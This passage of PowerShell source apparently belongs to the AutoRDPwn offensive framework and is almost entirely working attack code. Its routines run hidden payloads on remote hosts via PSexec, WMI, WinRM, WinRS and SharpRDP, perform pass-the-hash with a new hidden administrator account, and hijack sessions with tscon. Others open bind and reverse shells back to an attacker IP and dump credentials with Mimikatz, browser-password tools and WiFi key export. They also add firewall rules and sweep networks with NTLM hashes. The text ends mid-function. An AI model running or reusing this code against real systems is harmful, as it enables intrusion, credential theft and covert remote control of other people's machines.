        Write-ARWarn ((Get-ARText 'txt76' 'Cleaning done!') + ' ' + $targetStatus.Errors + ' step(s) failed: ' + ($steps -join '; '))
    }
    else {
        Write-ARInfo (Get-ARText 'txt76' 'Cleaning done!')
    }
}

function Get-ARAttackPayloadCommand {
    param([Parameter(Mandatory = $true)][string]$Payload)
    $escaped = $Payload -replace '"', '\"'
    return 'powershell.exe -windowstyle hidden -Command "' + $escaped + '"'
}

function Invoke-ARAttackPSexec {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 445 -Purpose 'PSexec'
    Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
    $executable = Join-Path $script:ARTools 'psexec.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    $failures = 0
    foreach ($payload in @(Get-ARPayloads)) {
        $arguments = @("\\$target")
        if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
        $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        if ($LASTEXITCODE -ne 0) { $failures++ }
    }
    if ($failures -gt 0) { Write-ARWarn ('PSexec failed on ' + $failures + ' payload(s), exit code ' + $LASTEXITCODE) }
    Set-ARStatus 'Payloads started with PSexec' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackPassTheHash {
    $target = Get-ARTargetComputer
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        $script:ARTarget['User'] = Read-ARValue 'User'
    }
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['Hash'])) {
        $script:ARTarget['Hash'] = Read-ARValue 'NTLM hash'
    }
    $user = [string]$script:ARTarget['User']
    $hash = [string]$script:ARTarget['Hash']
    $domain = [string]$script:ARTarget['Domain']
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1')
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
    }
    if ($script:ARCreateUser) {
        $createUser = Get-ARText 'Pwn5' ''
        if (-not [string]::IsNullOrWhiteSpace($createUser)) {
            Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
            if (-not $script:ARCreatedAccounts.Contains('AutoRDPwn')) { $script:ARCreatedAccounts.Add('AutoRDPwn') }
        }
    }
    $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
    Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createHashUser 2>&1 | ForEach-Object { Write-Host $_ }
    $script:ARHashUserName = $hashUser
    $secure = ConvertTo-SecureString -String 'AutoRDPwn' -AsPlainText -Force
    $script:AROverrideCredential = New-Object System.Management.Automation.PSCredential($hashUser, $secure)
    Start-Sleep -Seconds 2
    try {
        Connect-ARTargetSession -Force | Out-Null
        Invoke-ARShadowEngine | Out-Null
    }
    finally {
        $script:AROverrideCredential = $null
    }
}

function Invoke-ARAttackWmi {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 135 -Purpose 'WMI'
    $credential = Get-ARTargetCredential
    $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
    if ($credential) { $parameters['Credential'] = $credential }
    $cimSession = New-CimSession @parameters
    try {
        foreach ($payload in @(Get-ARPayloads)) {
            $command = Get-ARAttackPayloadCommand $payload
            $result = Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $command } -ErrorAction Stop
            if ($result.ReturnValue -ne 0) {
                Write-ARWarn ('WMI process creation returned ' + $result.ReturnValue)
            }
        }
    }
    finally { Remove-CimSession -CimSession $cimSession -ErrorAction SilentlyContinue }
    Set-ARStatus 'Payloads started with WMI' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRm {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRM'
    $credential = Get-ARTargetCredential
    foreach ($payload in @(Get-ARPayloads)) {
        $parameters = @{
            ComputerName = $target
            ScriptBlock = { param($command) & powershell.exe -WindowStyle Hidden -Command $command }
            ArgumentList = @($payload)
            ErrorAction = 'Stop'
        }
        if ($credential) {
            $parameters['Credential'] = $credential
            $parameters['Authentication'] = 'Negotiate'
        }
        Invoke-Command @parameters | Out-Null
    }
    Set-ARStatus 'Payloads started with WinRM' 'Ok'
    Connect-ARTargetSession -Force | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackWinRs {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRS'
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("/r:$target")
        if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
        $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
        & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
        if ($LASTEXITCODE -ne 0) { Write-ARWarn ('winrs returned ' + $LASTEXITCODE) }
        Start-Sleep -Milliseconds 600
    }
    Set-ARStatus 'Payloads started with WinRS' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackTscon {
    if (-not (Test-ARIsAdmin)) { throw 'Administrator privileges are required for TSCon.' }
    $query = & query.exe session 2>&1
    Show-ARText $query
    $sessionId = Get-ARSessionId $query 1
    if (-not $script:ARInvokedFromOption) {
        $answer = Read-ARValue 'Session ID' ([string]$sessionId)
        if ($answer -match '^\d+$') { $sessionId = [int]$answer }
    }
    $taskName = 'AutoRDPwnTscon' + [guid]::NewGuid().ToString('N').Substring(0, 8)
    $action = New-ScheduledTaskAction -Execute (Join-Path $env:SystemRoot 'System32\tscon.exe') -Argument ([string]$sessionId)
    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
        Start-Sleep -Seconds 2
    }
    finally {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    }
    Set-ARStatus ('Session ' + $sessionId + ' hijacked') 'Ok'
}

function Invoke-ARAttackRdp {
    $target = Get-ARTargetComputer
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpRDP.ps1'
    $executable = Join-Path $script:ARTools 'SharpRDP.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpRDP could not be extracted.' }
    $user = Get-ARTargetUserName
    $password = ''
    if ($user -ne '') { $password = Get-ARPlainPassword }
    foreach ($payload in @(Get-ARPayloads)) {
        $command = Get-ARAttackPayloadCommand $payload
        $arguments = @("computername=$target")
        if ($user -ne '') { $arguments += @("username=$user", "password=$password") }
        $arguments += "command=$command"
        & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
    }
    Set-ARStatus 'Payloads started with SharpRDP' 'Ok'
    Connect-ARTargetSession | Out-Null
    Invoke-ARShadowEngine | Out-Null
}

function Invoke-ARAttackQuickScreen {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Quick Screen'
    if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
        if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
        $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
    }
    $password = Get-ARPlainPassword
    # The frame server is pulled from the target, so no dial-back address is
    # needed here. Keep the field fresh for the attacks that do stage back.
    $routeAddress = Get-ARLocalIPv4 -Target $target
    if (-not [string]::IsNullOrWhiteSpace($routeAddress)) { $script:ARTarget['AttackerIP'] = $routeAddress }
    $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -ViewOnly:$viewOnly
    Set-ARStatus 'Quick Screen finished' 'Ok'
}

if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { $script:ARPortProxyPorts = New-Object System.Collections.Generic.List[string] }
if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { $script:ARModuleFiles = New-Object System.Collections.Generic.List[string] }

function Reset-AROperatorPortProxies {
    if (-not (Get-Variable -Name ARPortProxyPorts -Scope Script -ErrorAction SilentlyContinue)) { return }
    $records = @($script:ARPortProxyPorts.ToArray())
    if ($records.Count -eq 0) { return }
    foreach ($record in $records) {
        $listenPort = [string]$record
        $listenAddress = '0.0.0.0'
        $separator = $listenPort.IndexOf('|')
        if ($separator -ge 0) {
            $listenAddress = $listenPort.Substring($separator + 1)
            $listenPort = $listenPort.Substring(0, $separator)
        }
        if ([string]::IsNullOrWhiteSpace($listenPort)) { continue }
        if ([string]::IsNullOrWhiteSpace($listenAddress)) { $listenAddress = '0.0.0.0' }
        try {
            & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=$listenAddress" 2>&1> $null
            if ($LASTEXITCODE -ne 0 -and $listenAddress -ne '0.0.0.0') {
                & netsh.exe interface portproxy delete v4tov4 "listenport=$listenPort" "listenaddress=0.0.0.0" 2>&1> $null
            }
            if ($LASTEXITCODE -ne 0) { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
        }
        catch { Write-ARWarn ('Port proxy cleanup incomplete for listen port ' + $listenPort + '.') }
    }
    $script:ARPortProxyPorts.Clear()
}

function Remove-ARModuleArtifacts {
    if (-not (Get-Variable -Name ARModuleFiles -Scope Script -ErrorAction SilentlyContinue)) { return }
    $paths = @($script:ARModuleFiles.ToArray())
    if ($paths.Count -eq 0) { return }
    try {
        if (Test-ARIsLocalTarget) {
            foreach ($path in $paths) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
        }
        elseif ($script:ARSession) {
            Invoke-Command -Session $script:ARSession -ArgumentList $paths -ScriptBlock {
                param($items)
                foreach ($path in $items) { Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue }
            } -ErrorAction Stop | Out-Null
        }
    }
    catch { Write-ARWarn ('Module artifact cleanup incomplete: ' + $_.Exception.Message) }
    finally { $script:ARModuleFiles.Clear() }
}

function Invoke-ARModulePipeShell {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnPipe_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PipeShell.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe 'NamedPipeStream'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-PipeShell.ps1')
    Write-ARInfo 'Named pipe server started on the target.'
    Invoke-PipeShell -mode client -server $target -aeskey AutoRDPwn_AESKey -i -pipe 'NamedPipeStream' -timeout 120
    Set-ARStatus 'Named pipe shell closed' 'Ok'
}

function Invoke-ARModuleWinRsConsole {
    $target = Get-ARTargetComputer
    $user = Get-ARTargetUserName
    $arguments = @("/r:$target")
    if ($user -ne '') { $arguments += @("/u:$user", "/p:$(Get-ARPlainPassword)") }
    $arguments += @('/noecho', '/noprofile', '/allowdelegate', 'cmd.exe')
    Write-ARInfo 'Opening a WinRS console. Type exit to close it.'
    & winrs.exe @arguments
    Set-ARStatus 'WinRS console closed' 'Ok'
}

function Invoke-ARModuleHttpRevShell {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port') '8080'
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-WebRev.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $encoded = $webrev64 } finally { Pop-Location }
    if (-not $encoded) { throw 'The HTTP reverse shell payload is empty.' }
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($data, $address, $listenPort)
            $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))
            . ([scriptblock]::Create($source))
            Invoke-WebRev -ip $address -port $listenPort
        } -ArgumentList $encoded, $ip, $port | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        Invoke-Command -Session $session -ArgumentList $encoded, $ip, $port -ScriptBlock {
            param($data, $address, $listenPort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($payload, $remoteAddress, $remotePort)
                $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload))
                . ([scriptblock]::Create($source))
                Invoke-WebRev -ip $remoteAddress -port $remotePort
            } -ArgumentList $payload, $address, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RevShellServer.ps1'
    $server = Join-Path $script:ARTools 'server.exe'
    if (-not (Test-Path -LiteralPath $server)) { throw 'The reverse shell server could not be extracted.' }
    Write-ARInfo ('Starting HTTP reverse shell server on ' + $ip + ':' + $port + ' (Ctrl+C stops it).')
    & $server $ip $port
    Set-ARStatus 'HTTP reverse shell server stopped' 'Ok'
}

function Invoke-ARModuleNetcatDirect {
    $target = Get-ARTargetComputer
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $listenPort)
            . $path
            Invoke-PowerShellTcp -Bind -Port $listenPort
        } -ArgumentList $scriptPath, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, ([int]$port) -ScriptBlock {
            param($path, $listenPort)
            netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Remote Control Application" dir=in action=allow protocol=TCP localport=$listenPort 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $localPort)
                . $script
                Invoke-PowerShellTcp -Bind -Port $localPort
            } -ArgumentList $path, $listenPort | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Remote Control Application'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat direct connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc ' + $target + ' ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Set-ARStatus ('Listener started on ' + $target + ':' + $port) 'Ok'
}

function Invoke-ARModuleNetcatReverse {
    $target = Get-ARTargetComputer
    $ip = [string]$script:ARTarget['AttackerIP']
    if ([string]::IsNullOrWhiteSpace($ip)) {
        if ($script:ARInvokedFromOption) { throw 'The attacker IP is required.' }
        $ip = Read-ARValue (Get-ARText 'txt54' 'Enter the remote IP')
    }
    $port = Read-ARValue (Get-ARText 'txt53' 'Enter the port to listen to')
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-PowerShellTcp.ps1'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host ('Netcat reverse connection --> ') -NoNewline -ForegroundColor Green
    Write-Host ('nc -l ' + $port) -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path, $address, $remotePort)
            . $path
            Start-Sleep -Seconds 5
            Invoke-PowerShellTcp -Reverse -IPAddress $address -Port $remotePort
        } -ArgumentList $scriptPath, $ip, ([int]$port) | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnNetcat_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Invoke-PowerShellTcp.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript, $ip, ([int]$port) -ScriptBlock {
            param($path, $address, $remotePort)
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script, $remoteAddress, $targetPort)
                . $script
                Start-Sleep -Seconds 5
                Invoke-PowerShellTcp -Reverse -IPAddress $remoteAddress -Port $targetPort
            } -ArgumentList $path, $address, $remotePort | Out-Null
        } -ErrorAction Stop | Out-Null
    }
    Write-ARInfo 'The target will connect back in about 5 seconds. Keep the listener ready.'
    Set-ARStatus 'Reverse connection scheduled' 'Ok'
}

function Invoke-ARModuleMimikatzSam {
    Write-ARInfo 'Extracting credentials with Mimikatz (SAM)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate lsadump::sam exit' }
    Show-ARText $result
    Set-ARStatus 'SAM dump finished' 'Ok'
}

function Invoke-ARModuleMimikatzLogon {
    Write-ARInfo 'Extracting credentials with Mimikatz (logon passwords)...'
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Mimikatz.ps1' -Function 'Invoke-Mimikatz' -Arguments @{ Command = 'privilege::debug token::elevate sekurlsa::logonPasswords exit' }
    Show-ARText $result
    Set-ARStatus 'Logon password dump finished' 'Ok'
}

function Invoke-ARModuleSharpWeb {
    Import-ARToolScript 'Resources\Scripts\Invoke-SharpWeb.ps1'
    $executable = Join-Path $script:ARTools 'SharpWeb.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'SharpWeb could not be extracted.' }
    $result = Invoke-ARTargetBinary -LocalPath $executable -Arguments @('all')
    Show-ARText $result
    Set-ARStatus 'Browser password recovery finished' 'Ok'
}

function Invoke-ARModuleWifiKeys {
    $result = Invoke-ARTargetCommand -ScriptBlock {
        $directory = Join-Path $env:TEMP ('wifi_' + [guid]::NewGuid().ToString('N'))
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
        try {
            & netsh.exe wlan export profile folder="$directory" key=clear 2>&1> $null
            $lines = New-Object System.Collections.Generic.List[string]
            $profiles = Get-ChildItem -LiteralPath $directory -Filter '*.xml' -ErrorAction SilentlyContinue
            foreach ($profile in $profiles) {
                try {
                    [xml]$xml = Get-Content -LiteralPath $profile.FullName -Raw
                    $name = [string]$xml.WLANProfile.name
                    $key = [string]$xml.WLANProfile.MSM.security.sharedKey.keyMaterial
                    if ($name -ne '') { $lines.Add(('SSID: ' + $name + '  Key: ' + $key)) }
                } catch { }
            }
            if ($lines.Count -eq 0) { return 'There is no wireless network on this computer' }
            return ($lines -join "`n")
        }
        finally { Remove-Item -LiteralPath $directory -Recurse -Force -ErrorAction SilentlyContinue }
    }
    Show-ARText $result
    Set-ARStatus 'WiFi keys recovered' 'Ok'
}

function Invoke-ARModulePortScan {
    $target = Get-ARTargetComputer
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range') $target
    $speed = Read-ARValue (Get-ARText 'txt56' 'Enter the scanning speed (1-5)') '3'
    $ports = Read-ARValue (Get-ARText 'txt57' 'Enter the number of ports to scan (25-1000)') '100'
    if ($speed -notmatch '^[1-5]$') { $speed = '3' }
    if ($ports -notmatch '^\d+$') { $ports = '100' }
    $threads = @{ '1' = 10; '2' = 25; '3' = 50; '4' = 100; '5' = 200 }[$speed]
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'Continue'
    try {
        . (Get-ARResourcePath 'Resources\Scripts\Invoke-Portscan.ps1')
        Invoke-Portscan -Hosts $range -Threads $threads -TopPorts $ports
    }
    finally { $ProgressPreference = $oldProgress }
    Set-ARStatus 'Port scan finished' 'Ok'
}

function Invoke-ARModulePortForward {
    $operation = Read-ARValue 'Operation (1 local add, 2 remote add, 3 show, 4 reset)' '3'
    if (Test-ARIsLocalTarget) {
        $scriptBlock = {
            param($action, $lport, $lhost, $rport, $rhost)
            switch ($action) {
                'add' { & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost" }
                'show' { & netsh.exe interface portproxy show all }
                'reset' { & netsh.exe interface portproxy reset }
            }
        }
        if ($operation -eq '1' -or $operation -eq '2') {
            $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
            $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
            $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
            $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
            & $scriptBlock 'add' $lport $lhost $rport $rhost
            $proxyRecord = $lport + '|' + $lhost
            if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        }
        elseif ($operation -eq '4') { & $scriptBlock 'reset' }
        else { & $scriptBlock 'show' }
        Set-ARStatus 'Port forwarding updated' 'Ok'
        return
    }
    if ($operation -eq '1') {
        $lport = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $lhost = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $rport = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $rhost = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        $proxyRecord = $lport + '|' + $lhost
        if (-not $script:ARPortProxyPorts.Contains($proxyRecord)) { $script:ARPortProxyPorts.Add($proxyRecord) }
        Set-ARStatus 'Local port forwarding created' 'Ok'
        return
    }
    $parameters = @{}
    if ($operation -eq '2') {
        $parameters['lport'] = Read-ARValue (Get-ARText 'txt41' 'Enter the local port')
        $parameters['lhost'] = Read-ARValue (Get-ARText 'txt42' 'Which interface do you want to use?') '0.0.0.0'
        $parameters['rport'] = Read-ARValue (Get-ARText 'txt43' 'Enter the remote port')
        $parameters['rhost'] = Read-ARValue (Get-ARText 'txt44' 'Finally, the destination IP')
        Invoke-ARTargetCommand -ScriptBlock {
            param($lport, $lhost, $rport, $rhost)
            & netsh.exe interface portproxy add v4tov4 "listenport=$lport" "listenaddress=$lhost" "connectport=$rport" "connectaddress=$rhost"
        } -ArgumentList @($parameters['lport'], $parameters['lhost'], $parameters['rport'], $parameters['rhost']) | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding created' 'Ok'
    }
    elseif ($operation -eq '4') {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy reset } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding reset' 'Ok'
    }
    else {
        Invoke-ARTargetCommand -ScriptBlock { & netsh.exe interface portproxy show all } | ForEach-Object { Write-Host $_ }
        Set-ARStatus 'Remote port forwarding listed' 'Ok'
    }
}

function Invoke-ARModuleWebServer {
    $target = Get-ARTargetComputer
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Start-WebServer.ps1'
    if (Test-ARIsLocalTarget) {
        Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
            param($path)
            . $path
            Start-WebServer -BINDING 'http://+:8080/'
        } -ArgumentList $scriptPath | Out-Null
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnWeb_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'Start-WebServer.ps1'
        Copy-ARFileToTarget -LocalPath $scriptPath -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        Invoke-Command -Session $session -ArgumentList $remoteScript -ScriptBlock {
            param($path)
            netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
            netsh advfirewall firewall add rule name="Powershell Web Server" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
            Start-Job -Name ('AutoRDPwn_' + [guid]::NewGuid().ToString('N')) -ScriptBlock {
                param($script)
                . $script
                Start-WebServer -BINDING 'http://+:8080/'
            } -ArgumentList $path | Out-Null
        } -ErrorAction Stop | Out-Null
        $ruleName = 'Powershell Web Server'
        if (Get-Variable -Name ARFirewallRules -Scope Script -ErrorAction SilentlyContinue) { if (-not $script:ARFirewallRules.Contains($ruleName)) { $script:ARFirewallRules.Add($ruleName) } }
    }
    $url = 'http://' + $target + ':8080/'
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    Write-Host 'Powershell Web Server --> ' -NoNewline -ForegroundColor Green
    Write-Host $url -ForegroundColor Blue
    Write-Host '----------------------------------------------------------------------' -ForegroundColor Gray
    try { Start-Process $url | Out-Null } catch { }
    Set-ARStatus 'Web server started' 'Ok'
}

function Invoke-ARModuleCredScan {
    $range = Read-ARValue (Get-ARText 'txt55' 'Enter the IP or network range')
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $method = Read-ARValue (Get-ARText 'txt83' 'Select the verification method (Hash / Password)') 'hash'
    $method = $method.ToLowerInvariant()
    if ($method -like 'pass*' -or $method -like 'contra*') {
        $plain = Read-ARSecret 'Password'
        . (Get-ARResourcePath 'Resources\Scripts\Get-NTLM.ps1')
        $hash = Get-NTLM $plain
    }
    else {
        $hash = Read-ARValue (Get-ARText 'txt84' 'Enter the NTLM Hash')
    }
    $protocol = Read-ARValue (Get-ARText 'txt85' 'Enter the protocol you want to use (SMB / WMI)') 'SMB'
    . (Get-ARResourcePath 'Resources\Scripts\Check-LocalAdminHash.ps1')
    Check-LocalAdminHash -Username $user -PasswordHash $hash -CIDR $range -Protocol $protocol -Threads 20
    Set-ARStatus 'Credential scan finished' 'Ok'
}

function Invoke-ARModuleRdpCaching {
    if (-not (Test-ARIsLocalTarget)) { throw 'RDP-Caching only reads the local image cache.' }
    Write-ARWarn (Get-ARText 'txt19' 'This process can take several minutes..')
    $null = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\RDP-Caching.ps1'
    $recovered = Join-Path $env:TEMP 'Recovered_RDP_Session'
    if (-not (Test-Path -LiteralPath $recovered)) { throw 'No cached RDP images were recovered.' }
    if (-not $script:ARModuleFiles.Contains($recovered)) { $script:ARModuleFiles.Add($recovered) }
    Write-ARSuccess ('Recovered images: ' + $recovered)
    try { Start-Process explorer.exe -ArgumentList $recovered | Out-Null } catch { }
    if (-not $script:ARInvokedFromOption) {
        $null = Read-ARLineValue ' Press Enter to delete the recovered folder: '
        Remove-Item -LiteralPath $recovered -Recurse -Force -ErrorAction SilentlyContinue
    }
    Set-ARStatus 'RDP cache rebuilt' 'Ok'
}

function Invoke-ARModuleListUsers {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\ListAllUsers.ps1' -Function 'ListAllUsers'
    Show-ARText $result
    Set-ARStatus 'User enumeration finished' 'Ok'
}

function Invoke-ARModuleSessionGopher {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\SessionGopher.ps1' -Function 'Invoke-SessionGopher' -Arguments @{ Thorough = $true }
    Show-ARText $result
    Set-ARStatus 'SessionGopher finished' 'Ok'
}

function Invoke-ARModuleStickyKeys {
